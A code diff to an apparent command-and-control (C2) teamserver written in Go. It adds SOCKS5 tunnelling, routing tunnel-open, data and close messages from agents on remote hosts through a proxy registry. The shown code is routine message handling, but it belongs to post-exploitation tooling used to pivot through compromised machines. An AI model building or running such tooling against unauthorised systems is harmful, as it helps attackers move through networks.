@@ -9,22 +9,25 @@ import (
 
 	"c2/internal/teamserver/crypto"
 	"c2/internal/teamserver/database"
+	"c2/internal/teamserver/socks5"
 	"c2/pkg/protocol"
 )
 
 // Handler processes incoming agent connections.
 type Handler struct {
-	agentMgr  *Manager
-	taskMgr   *TaskManager
-	masterKey []byte
+	agentMgr      *Manager
+	taskMgr       *TaskManager
+	masterKey     []byte
+	socksRegistry *socks5.ProxyRegistry
 }
 
 // NewHandler creates a new agent connection handler.
-func NewHandler(agentMgr *Manager, taskMgr *TaskManager, masterKey []byte) *Handler {
+func NewHandler(agentMgr *Manager, taskMgr *TaskManager, masterKey []byte, socksRegistry *socks5.ProxyRegistry) *Handler {
 	return &Handler{
-		agentMgr:  agentMgr,
-		taskMgr:   taskMgr,
-		masterKey: masterKey,
+		agentMgr:      agentMgr,
+		taskMgr:       taskMgr,
+		masterKey:     masterKey,
+		socksRegistry: socksRegistry,
 	}
 }
 
@@ -240,6 +243,36 @@ func (h *Handler) agentLoop(conn net.Conn, agentID string, cipher *crypto.Cipher
 				Type:    EventTaskComplete,
 				Data:    result,
 			})
+
+		case protocol.MsgTunnelConnected:
+			var msg protocol.TunnelConnected
+			if err := protocol.Deserialize(plaintext, &msg); err != nil {
+				log.Printf("[ERROR] Deserializing tunnel connected: %v", err)
+				continue
+			}
+			if h.socksRegistry != nil {
+				h.socksRegistry.HandleTunnelConnected(agentID, msg)
+			}
+
+		case protocol.MsgTunnelData:
+			var msg protocol.TunnelData
+			if err := protocol.Deserialize(plaintext, &msg); err != nil {
+				log.Printf("[ERROR] Deserializing tunnel data: %v", err)
+				continue
+			}
+			if h.socksRegistry != nil {
+				h.socksRegistry.RouteData(agentID, msg.TunnelID, msg.Data)
+			}
+
+		case protocol.MsgTunnelClose:
+			var msg protocol.TunnelClose
+			if err := protocol.Deserialize(plaintext, &msg); err != nil {
+				log.Printf("[ERROR] Deserializing tunnel close: %v", err)
+				continue
+			}
+			if h.socksRegistry != nil {
+				h.socksRegistry.HandleTunnelClose(agentID, msg)
+			}
 
 		default:
 			log.Printf("[WARN] Unknown message type %d from agent %s", msgType, agentID)
